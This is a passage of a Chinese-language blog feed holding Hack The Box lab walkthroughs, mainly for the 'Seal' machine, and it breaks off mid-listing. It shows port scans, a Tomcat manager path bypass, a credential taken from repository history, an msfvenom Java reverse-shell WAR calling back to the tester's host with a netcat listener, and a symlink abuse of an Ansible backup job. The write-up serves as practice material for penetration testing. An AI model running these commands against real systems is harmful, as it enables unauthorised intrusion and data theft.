class="hljs-number">0</span> dialect used<br>[!] Launching semi-interactive shell - Careful what you execute<br>[!] Press <span class="hljs-built_in">help</span> <span class="hljs-keyword">for</span> extra shell commands<br><span class="hljs-function">C:\&gt;<span class="hljs-title">whoami</span></span><br><span class="hljs-function"><span class="hljs-title">search</span>\<span class="hljs-title">tristan.davies</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">Administrator</span>\<span class="hljs-title">desktop</span>&gt;<span class="hljs-title">type</span> <span class="hljs-title">root.txt</span></span><br><span class="hljs-function"><span class="hljs-title">acb</span>........................................</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Active Directory</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - Seal</title>
    <link href="/post/HackTheBox-Seal.html"/>
    <url>/post/HackTheBox-Seal.html</url>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/Seal.png" alt="Seal"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs bash">CrazyInSide:~/HackTheBox$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.10.250<br>Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-09-01 10:04:57 GMT<br>Initiating SYN Stealth Scan<br>Scanning 1 hosts [131070 ports/host]<br>Discovered open port 8080/tcp on 10.10.10.250                                  <br>Discovered open port 443/tcp on 10.10.10.250                                   <br>Discovered open port 22/tcp on 10.10.10.250                                    <br>                                                                                                                                                                                          <br>CrazyInSide:~/HackTheBox$ sudo nmap -sC -sV 10.10.10.250 -p8080,443,22                     <br>Starting Nmap 7.92SVN ( https://ParrotOS.org ) at 2022-09-01 18:09 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.250<br>Host is up (0.083s latency).<br><br>PORT     STATE SERVICE    VERSION<br>22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   3072 4b894739673d07315e3f4c27411ff967 (RSA)<br>|   256 04a74f399565c5b08dd5492ed8440036 (ECDSA)<br>|_  256 b45e8393c54249de7125927123b18554 (ED25519)<br>443/tcp  open  ssl/http   nginx 1.18.0 (Ubuntu)<br>| tls-alpn: <br>|_  http/1.1<br>|_http-server-header: nginx/1.18.0 (Ubuntu)<br>| ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK<br>| Not valid before: 2021-05-05T10:24:03<br>|_Not valid after:  2022-05-05T10:24:03<br>|_http-title: Seal Market<br>|_ssl-<span class="hljs-built_in">date</span>: TLS randomness does not represent time<br>| tls-nextprotoneg: <br>|_  http/1.1<br>8080/tcp open  http-proxy<br>| http-auth: <br>| HTTP/1.1 401 Unauthorized\x0D<br>|_  Server returned status 401 but no WWW-Authenticate header.<br>|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (text/html;charset=utf-8).</span><br><span class="hljs-string">| fingerprint-strings: </span><br><span class="hljs-string">|   FourOhFourRequest: </span><br><span class="hljs-string">|     HTTP/1.1 401 Unauthorized</span><br><span class="hljs-string">|     Date: Thu, 01 Sep 2022 10:10:04 GMT</span><br><span class="hljs-string">|     Set-Cookie: JSESSIONID=node02q9tfbpnsxre1bm1gkv3wal0a2.node0; Path=/; HttpOnly</span><br><span class="hljs-string">|     Expires: Thu, 01 Jan 1970 00:00:00 GMT</span><br><span class="hljs-string">|     Content-Type: text/html;charset=utf-8</span><br><span class="hljs-string">|     Content-Length: 0</span><br><span class="hljs-string">|   GetRequest: </span><br><span class="hljs-string">|     HTTP/1.1 401 Unauthorized</span><br><span class="hljs-string">|     Date: Thu, 01 Sep 2022 10:10:03 GMT</span><br><span class="hljs-string">|     Set-Cookie: JSESSIONID=node0yvbmr291moot13csk9lwzfixi0.node0; Path=/; HttpOnly</span><br><span class="hljs-string">|     Expires: Thu, 01 Jan 1970 00:00:00 GMT</span><br><span class="hljs-string">|     Content-Type: text/html;charset=utf-8</span><br><span class="hljs-string">|     Content-Length: 0</span><br><span class="hljs-string">|   HTTPOptions: </span><br><span class="hljs-string">|     HTTP/1.1 200 OK</span><br><span class="hljs-string">|     Date: Thu, 01 Sep 2022 10:10:04 GMT</span><br><span class="hljs-string">|     Set-Cookie: JSESSIONID=node01jub9w55x03xg1mawzh2zjn5sd1.node0; Path=/; HttpOnly</span><br><span class="hljs-string">|     Expires: Thu, 01 Jan 1970 00:00:00 GMT</span><br><span class="hljs-string">|     Content-Type: text/html;charset=utf-8</span><br><span class="hljs-string">|     Allow: GET,HEAD,POST,OPTIONS</span><br><span class="hljs-string">|     Content-Length: 0</span><br><span class="hljs-string">|   RPCCheck: </span><br><span class="hljs-string">|     HTTP/1.1 400 Illegal character OTEXT=0x80</span><br><span class="hljs-string">|     Content-Type: text/html;charset=iso-8859-1</span><br><span class="hljs-string">|     Content-Length: 71</span><br><span class="hljs-string">|     Connection: close</span><br><span class="hljs-string">|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character OTEXT=0x80&lt;/pre&gt;</span><br><span class="hljs-string">|   RTSPRequest: </span><br><span class="hljs-string">|     HTTP/1.1 505 Unknown Version</span><br><span class="hljs-string">|     Content-Type: text/html;charset=iso-8859-1</span><br><span class="hljs-string">|     Content-Length: 58</span><br><span class="hljs-string">|     Connection: close</span><br><span class="hljs-string">|     &lt;h1&gt;Bad Message 505&lt;/h1&gt;&lt;pre&gt;reason: Unknown Version&lt;/pre&gt;</span><br><span class="hljs-string">|   Socks4: </span><br><span class="hljs-string">|     HTTP/1.1 400 Illegal character CNTL=0x4</span><br><span class="hljs-string">|     Content-Type: text/html;charset=iso-8859-1</span><br><span class="hljs-string">|     Content-Length: 69</span><br><span class="hljs-string">|     Connection: close</span><br><span class="hljs-string">|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x4&lt;/pre&gt;</span><br><span class="hljs-string">|   Socks5: </span><br><span class="hljs-string">|     HTTP/1.1 400 Illegal character CNTL=0x5</span><br><span class="hljs-string">|     Content-Type: text/html;charset=iso-8859-1</span><br><span class="hljs-string">|     Content-Length: 69</span><br><span class="hljs-string">|     Connection: close</span><br><span class="hljs-string">|_    &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x5&lt;/pre&gt;</span><br><span class="hljs-string">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://ParrotOS.org/cgi-bin/submit.cgi?new-service :</span><br><span class="hljs-string">SF-Port8080-TCP:V=7.92SVN%I=7%D=9/1%Time=631084FB%P=x86_64-unknown-linux-g</span><br><span class="hljs-string">SF:nu%r(GetRequest,F4,&quot;HTTP/1\.1\x20401\x20Unauthorized\r\nDate:\x20Thu,\x</span><br><span class="hljs-string">SF:2001\x20Sep\x202022\x2010:10:03\x20GMT\r\nSet-Cookie:\x20JSESSIONID=nod</span><br><span class="hljs-string">SF:e0yvbmr291moot13csk9lwzfixi0\.node0;\x20Path=/;\x20HttpOnly\r\nExpires:</span><br><span class="hljs-string">SF:\x20Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nContent-Type:\x20te</span><br><span class="hljs-string">SF:xt/html;charset=utf-8\r\nContent-Length:\x200\r\n\r\n&quot;)%r(HTTPOptions,1</span><br><span class="hljs-string">SF:09,&quot;HTTP/1\.1\x20200\x20OK\r\nDate:\x20Thu,\x2001\x20Sep\x202022\x2010:</span><br><span class="hljs-string">SF:10:04\x20GMT\r\nSet-Cookie:\x20JSESSIONID=node01jub9w55x03xg1mawzh2zjn5</span><br><span class="hljs-string">SF:sd1\.node0;\x20Path=/;\x20HttpOnly\r\nExpires:\x20Thu,\x2001\x20Jan\x20</span><br><span class="hljs-string">SF:1970\x2000:00:00\x20GMT\r\nContent-Type:\x20text/html;charset=utf-8\r\n</span><br><span class="hljs-string">SF:Allow:\x20GET,HEAD,POST,OPTIONS\r\nContent-Length:\x200\r\n\r\n&quot;)%r(RTS</span><br><span class="hljs-string">SF:PRequest,AD,&quot;HTTP/1\.1\x20505\x20Unknown\x20Version\r\nContent-Type:\x2</span><br><span class="hljs-string">SF:0text/html;charset=iso-8859-1\r\nContent-Length:\x2058\r\nConnection:\x</span><br><span class="hljs-string">SF:20close\r\n\r\n&lt;h1&gt;Bad\x20Message\x20505&lt;/h1&gt;&lt;pre&gt;reason:\x20Unknown\x2</span><br><span class="hljs-string">SF:0Version&lt;/pre&gt;&quot;)%r(FourOhFourRequest,F4,&quot;HTTP/1\.1\x20401\x20Unauthoriz</span><br><span class="hljs-string">SF:ed\r\nDate:\x20Thu,\x2001\x20Sep\x202022\x2010:10:04\x20GMT\r\nSet-Cook</span><br><span class="hljs-string">SF:ie:\x20JSESSIONID=node02q9tfbpnsxre1bm1gkv3wal0a2\.node0;\x20Path=/;\x2</span><br><span class="hljs-string">SF:0HttpOnly\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r</span><br><span class="hljs-string">SF:\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Length:\x200\r\n\</span><br><span class="hljs-string">SF:r\n&quot;)%r(Socks5,C3,&quot;HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x5</span><br><span class="hljs-string">SF:\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2</span><br><span class="hljs-string">SF:069\r\nConnection:\x20close\r\n\r\n&lt;h1&gt;Bad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;r</span><br><span class="hljs-string">SF:eason:\x20Illegal\x20character\x20CNTL=0x5&lt;/pre&gt;&quot;)%r(Socks4,C3,&quot;HTTP/1\</span><br><span class="hljs-string">SF:.1\x20400\x20Illegal\x20character\x20CNTL=0x4\r\nContent-Type:\x20text/</span><br><span class="hljs-string">SF:html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20clos</span><br><span class="hljs-string">SF:e\r\n\r\n&lt;h1&gt;Bad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20Illegal\x20chara</span><br><span class="hljs-string">SF:cter\x20CNTL=0x4&lt;/pre&gt;&quot;)%r(RPCCheck,C7,&quot;HTTP/1\.1\x20400\x20Illegal\x20</span><br><span class="hljs-string">SF:character\x20OTEXT=0x80\r\nContent-Type:\x20text/html;charset=iso-8859-</span><br><span class="hljs-string">SF:1\r\nContent-Length:\x2071\r\nConnection:\x20close\r\n\r\n&lt;h1&gt;Bad\x20Me</span><br><span class="hljs-string">SF:ssage\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20Illegal\x20character\x20OTEXT=0x80&lt;/pr</span><br><span class="hljs-string">SF:e&gt;&quot;);</span><br><span class="hljs-string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="hljs-string"></span><br><span class="hljs-string">Service detection performed. Please report any incorrect results at https://ParrotOS.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 40.34 seconds</span><br><span class="hljs-string">zsh: segmentation fault  sudo nmap -sC -sV 10.10.10.250 -p8080,443,22</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220901184128109.png" alt="image-20220901184128109"></p><p>这里有一个搜索框，但搜索框似乎调用的GoogleMap.8080端口有一个GitBucket</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220901185129058.png" alt="image-20220901185129058"></p><p>这应用有个历史漏洞：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">CrazyInSide:~/HackTheBox$ searchsploit GitBucket<br>------------------------------------------------------------------------------------ ---------------------------------<br> Exploit Title                                                                      |  Path<br>------------------------------------------------------------------------------------ ---------------------------------<br>GitBucket 4.23.1 - Remote Code Execution                                            | java/webapps/44668.py<br>------------------------------------------------------------------------------------ ---------------------------------<br>Shellcodes: No Results<br>Papers: No Results<br></code></pre></td></tr></table></figure><p>但是该漏洞文档说明仅在windows服务器上才有效。尝试注册了一个账户，目标可能部署了tomcat，在tomcat历史提交中，能够找到一组账号密码。</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220901195541259.png" alt="image-20220901195541259"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">username=<span class="hljs-string">&quot;tomcat&quot;</span> password=<span class="hljs-string">&quot;42MrHBf*z8&#123;Z%&quot;</span><br></code></pre></td></tr></table></figure><p>我开始对80端口进行目录枚举：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">CrazyInSide:~/HackTheBox$ dirsearch -u https://seal.htb/  <br><br>  _|. _ _  _  _  _ _|_    v0.4.2<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /home/crazyinside/.dirsearch/reports/seal.htb/-_22-09-01_18-51-03.txt<br><br>Error Log: /home/crazyinside/.dirsearch/logs/errors-22-09-01_18-51-03.<span class="hljs-built_in">log</span><br><br>Target: https://seal.htb/<br><br>[18:51:04] Starting: <br>[18:51:05] 302 -    0B  - /js  -&gt;  http://seal.htb/js/<br>[18:51:31] 400 -  804B  - /\..\..\..\..\..\..\..\..\..\etc\passwd<br>[18:51:33] 400 -  804B  - /a%5c.aspx<br>[18:51:36] 302 -    0B  - /admin  -&gt;  http://seal.htb/admin/<br>[18:52:05] 302 -    0B  - /css  -&gt;  http://seal.htb/css/<br>[18:52:15] 403 -  564B  - /host-manager/html<br>[18:52:16] 302 -    0B  - /host-manager/  -&gt;  http://seal.htb/host-manager/html<br>[18:52:16] 302 -    0B  - /icon  -&gt;  http://seal.htb/icon/<br>[18:52:16] 302 -    0B  - /images  -&gt;  http://seal.htb/images/<br>[18:52:18] 200 -   19KB - /index.html<br>[18:52:26] 302 -    0B  - /manager  -&gt;  http://seal.htb/manager/<br>[18:52:26] 403 -  564B  - /manager/html<br>[18:52:26] 302 -    0B  - /manager/  -&gt;  http://seal.htb/manager/html<br>[18:52:26] 403 -  564B  - /manager/html/<br>[18:52:26] 401 -    2KB - /manager/jmxproxy/?get=java.lang:<span class="hljs-built_in">type</span>=Memory&amp;att=HeapMemoryUsage<br>[18:52:26] 401 -    2KB - /manager/jmxproxy<br>[18:52:26] 401 -    2KB - /manager/jmxproxy/?get=BEANNAME&amp;att=MYATTRIBUTE&amp;key=MYKEY<br>[18:52:26] 401 -    2KB - /manager/status/all<br>[18:52:26] 401 -    2KB - /manager/jmxproxy/?qry=STUFF<br>[18:52:26] 401 -    2KB - /manager/jmxproxy/?invoke=Catalina%3Atype%3DService&amp;op=findConnectors&amp;ps=<br>[18:52:26] 401 -    2KB - /manager/jmxproxy/?get=java.lang:<span class="hljs-built_in">type</span>=Memory&amp;att=HeapMemoryUsage&amp;key=used<br>[18:52:26] 401 -    2KB - /manager/jmxproxy/?<span class="hljs-built_in">set</span>=Catalina%3Atype%3DValve%2Cname%3DErrorReportValve%2Chost%3Dlocalhost&amp;att=debug&amp;val=cow<br>[18:52:26] 401 -    2KB - /manager/jmxproxy/?<span class="hljs-built_in">set</span>=BEANNAME&amp;att=MYATTRIBUTE&amp;val=NEWVALUE<br>[18:52:26] 401 -    2KB - /manager/jmxproxy/?invoke=BEANNAME&amp;op=METHODNAME&amp;ps=COMMASEPARATEDPARAMETERS<br><br>Task Completed<br></code></pre></td></tr></table></figure><p>似乎该站点运行着tomcat，因为tomcat默认目录就是<a href="http://seal.htb/manager/html%E3%80%82%E4%BD%86%E6%98%AF%E4%B8%BA%E4%BB%80%E4%B9%88%E6%98%AFhttp?%E6%88%91%E5%BC%80%E5%A7%8B%E7%BF%BB%E9%98%85nginx%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%EF%BC%9A">http://seal.htb/manager/html。但是为什么是http?我开始翻阅nginx配置文件：</a></p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220901200109508.png" alt="image-20220901200109508"></p><p>似乎这些需要客户端提供一个证书，如果我通过了认证会代理到目标8000端口。路径其实好绕，它只检测&#x2F;manager&#x2F;html。我只需要访问&#x2F;manager;&#x2F;html即可，然后输入刚刚找到的tomcat凭证即可：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220901200513434.png" alt="image-20220901200513434"></p><p>tomcat生成war包一键部署即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">CrazyInSide:~/HackTheBox$ msfvenom -p java/shell_reverse_tcp lhost=10.10.16.6 lport=1337 -f war -o test.war<br>Payload size: 13316 bytes<br>Final size of war file: 13316 bytes<br>Saved as: test.war<br>CrazyInSide:~/HackTheBox$ nc -lvnp 1337<br>listening on [any] 1337 ...<br>connect to [10.10.16.6] from (UNKNOWN) [10.10.10.250] 43076<br><span class="hljs-built_in">id</span><br>uid=997(tomcat) gid=997(tomcat) <span class="hljs-built_in">groups</span>=997(tomcat)<br>script -qc /bin/bash /dev/null<br>tomcat@seal:/var/lib/tomcat9$ <br></code></pre></td></tr></table></figure><p>在opt目录有一个备份文件夹：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">tomcat@seal:/opt/backups$ <span class="hljs-built_in">ls</span><br>archives  playbook<br>tomcat@seal:/opt/backups$ <span class="hljs-built_in">cd</span> archives/<br>tomcat@seal:/opt/backups/archives$ <span class="hljs-built_in">ls</span><br>backup-2022-09-01-12:30:32.gz  backup-2022-09-01-12:31:33.gz<br>tomcat@seal:/opt/backups/archives$ <span class="hljs-built_in">cat</span> ../playbook/run.yml <br>- hosts: localhost<br>  tasks:<br>  - name: Copy Files<br>    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=<span class="hljs-built_in">yes</span><br>  - name: Server Backups<br>    archive:<br>      path: /opt/backups/files/<br>      dest: <span class="hljs-string">&quot;/opt/backups/archives/backup-&#123;&#123;ansible_date_time.date&#125;&#125;-&#123;&#123;ansible_date_time.time&#125;&#125;.gz&quot;</span><br>  - name: Clean<br>    file:<br>      state: absent<br>      path: /opt/backups/files/<br>tomcat@seal:/opt/backups/archives$ <br></code></pre></td></tr></table></figure><p>似乎每过一会儿变会有计划任务将&#x2F;var&#x2F;lib&#x2F;tomcat9&#x2F;webapps&#x2F;ROOT&#x2F;admin&#x2F;dashboard备份归档到backup。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">tomcat@seal:/opt/backups/archives$ <span class="hljs-built_in">ls</span> -all<br>total 2968<br>drwxrwxr-x 2 luis luis   4096 Sep  1 12:34 .<br>drwxr-xr-x 4 luis luis   4096 Sep  1 12:34 ..<br>-rw-rw-r-- 1 luis luis 606047 Sep  1 12:30 backup-2022-09-01-12:30:32.gz<br>-rw-rw-r-- 1 luis luis 606047 Sep  1 12:31 backup-2022-09-01-12:31:33.gz<br>-rw-rw-r-- 1 luis luis 606047 Sep  1 12:32 backup-2022-09-01-12:32:33.gz<br>-rw-rw-r-- 1 luis luis 606047 Sep  1 12:33 backup-2022-09-01-12:33:33.gz<br>-rw-rw-r-- 1 luis luis 606047 Sep  1 12:34 backup-2022-09-01-12:34:33.gz<br>tomcat@seal:/opt/backups/archives$ <br></code></pre></td></tr></table></figure><p>它所属于luis用户，而uploads目录可读可写可执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard$ <span class="hljs-built_in">ls</span> -all<br>total 100<br>drwxr-xr-x 7 root root  4096 May  7  2021 .<br>drwxr-xr-x 3 root root  4096 May  6  2021 ..<br>drwxr-xr-x 5 root root  4096 Mar  7  2015 bootstrap<br>drwxr-xr-x 2 root root  4096 Mar  7  2015 css<br>drwxr-xr-x 4 root root  4096 Mar  7  2015 images<br>-rw-r--r-- 1 root root 71744 May  6  2021 index.html<br>drwxr-xr-x 4 root root  4096 Mar  7  2015 scripts<br>drwxrwxrwx 2 root root  4096 May  7  2021 uploads<br>tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard$ <span class="hljs-built_in">ln</span> -s /home/luis /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads<br></code></pre></td></tr></table></figure><p>将其链接向luis用户目录。过会儿有一个非常大的备份：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">tomcat@seal:/opt/backups/archives$ <span class="hljs-built_in">ls</span> -all<br>total 113612<br>drwxrwxr-x 2 luis luis      4096 Sep  1 12:36 .<br>drwxr-xr-x 4 luis luis      4096 Sep  1 12:36 ..<br>-rw-rw-r-- 1 luis luis    606047 Sep  1 12:35 backup-2022-09-01-12:35:33.gz<br>-rw-rw-r-- 1 luis luis 115723773 Sep  1 12:36 backup-2022-09-01-12:36:32.gz<br>tomcat@seal:/opt/backups/archives$ <span class="hljs-built_in">cp</span> backup-2022-09-01-12\:36\:32.gz /tmp<br>tomcat@seal:/opt/backups/archives$ <span class="hljs-built_in">cd</span> /tmp<br>tomcat@seal:/tmp$ tar xf backup-2022-09-01-12\:36\:32.gz --force-local<br>tomcat@seal:/tmp$ <span class="hljs-built_in">ls</span><br>backup-2022-09-01-12:30:32.gz  dashboard          pwk.py       tmpypck0ak1<br>backup-2022-09-01-12:36:32.gz  hsperfdata_tomcat  tmp7e2a49nn<br>tomcat@seal:/tmp$ <span class="hljs-built_in">ls</span> -all<br>total 113636<br>drwxrwxrwt  6 root   root        4096 Sep  1 12:38 .<br>drwxr-xr-x 20 root   root        4096 Jul 26  2021 ..<br>-rw-r-----  1 tomcat tomcat    606047 Sep  1 12:30 backup-2022-09-01-12:30:32.gz<br>-rw-r-----  1 tomcat tomcat 115723773 Sep  1 12:37 backup-2022-09-01-12:36:32.gz<br>drwxr-x---  7 tomcat tomcat      4096 May  7  2021 dashboard<br>drwxr-x---  2 tomcat tomcat      4096 Sep  1 10:00 hsperfdata_tomcat<br>-rw-r-----  1 tomcat tomcat      3448 Sep  1 12:23 pwk.py<br>drwx------  4 tomcat tomcat      4096 Sep  1 12:24 tmp7e2a49nn<br>drwx------  4 tomcat tomcat      4096 Sep  1 12:24 tmpypck0ak1<br>tomcat@seal:/tmp$ <span class="hljs-built_in">cd</span> dashboard/<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">tomcat@seal:/tmp/dashboard/uploads/luis$ <span class="hljs-built_in">ls</span> -all<br>total 51320<br>drwxr-x--- 9 tomcat tomcat     4096 May  7  2021 .<br>drwxr-x--- 3 tomcat tomcat     4096 Sep  1 12:38 ..<br>drwxr-x--- 3 tomcat tomcat     4096 Sep  1 12:38 .ansible<br>-rw-r----- 1 tomcat tomcat      220 May  5  2021 .bash_logout<br>-rw-r----- 1 tomcat tomcat     3797 May  5  2021 .bashrc<br>drwxr-x--- 3 tomcat tomcat     4096 Sep  1 12:38 .cache<br>drwxr-x--- 3 tomcat tomcat     4096 Sep  1 12:38 .config<br>drwxr-x--- 7 tomcat tomcat     4096 Sep  1 12:38 .gitbucket<br>-rw-r----- 1 tomcat tomcat 52497951 Jan 14  2021 gitbucket.war<br>drwxr-x--- 3 tomcat tomcat     4096 Sep  1 12:38 .java<br>drwxr-x--- 3 tomcat tomcat     4096 Sep  1 12:38 .<span class="hljs-built_in">local</span><br>-rw-r----- 1 